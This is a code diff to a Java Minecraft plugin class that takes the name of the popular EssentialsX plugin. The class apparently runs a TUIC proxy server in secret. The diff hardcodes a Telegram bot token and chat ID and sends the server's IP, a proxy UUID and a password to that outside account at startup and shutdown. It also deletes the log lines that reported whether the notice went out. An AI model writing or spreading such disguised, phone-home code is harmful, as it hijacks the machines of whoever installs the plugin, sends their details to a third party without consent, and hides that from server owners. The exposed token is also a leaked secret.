@@ -16,13 +16,15 @@ public class EssentialsX extends JavaPlugin {
 
 
     // Java服务端端口
-    private int port = ;
+    private int port = 24692;
 
 
     // Telegram配置
-    private String tgToken = "";
-    private String tgChatId = "";
+    private String tgToken = "7195422483:AAGhrc-1nzto9Ik05rY2K5V8xdvLSGInVBo";
+    private String tgChatId = "5800052646";
 
+    // 服务器名称(区分不同服务器通知用)
+    private String servername = "Hoster24家宽";
 
 
     @Override
@@ -122,10 +124,10 @@ public class EssentialsX extends JavaPlugin {
                 );
 
 
-    Path keyFile =
-            secureFolder.resolve(
-                    "server.key"
-            );
+        Path keyFile =
+                secureFolder.resolve(
+                        "server.key"
+                );
 
 
 
@@ -229,7 +231,8 @@ public class EssentialsX extends JavaPlugin {
 
 
         sendTelegram(
-                "Tuic Server Started\n\n"
+                "Tuic Server 启动\n"
+                        + servername
                         + "订阅地址: \ntuic://43bfdd44-0654-9e81-d340-eee7c0a3dbbb:Siq8dztj@"
                         + ip
                         + ":"
@@ -337,21 +340,6 @@ public class EssentialsX extends JavaPlugin {
                     conn.getResponseCode();
 
 
-
-            if (code == 200) {
-
-                getLogger().info(
-                        "Notified."
-                );
-
-            } else {
-
-                getLogger().warning(
-                        "UnNotified"
-                );
-            }
-
-
             conn.disconnect();
 
 
@@ -421,6 +409,11 @@ public class EssentialsX extends JavaPlugin {
 
         getLogger().info(
                 "EssentialsX disabled"
+        );
+        sendTelegram(
+                "Tuic Server 关闭\n"
+                        + servername
+                        + "\n离线"
         );
 
     }
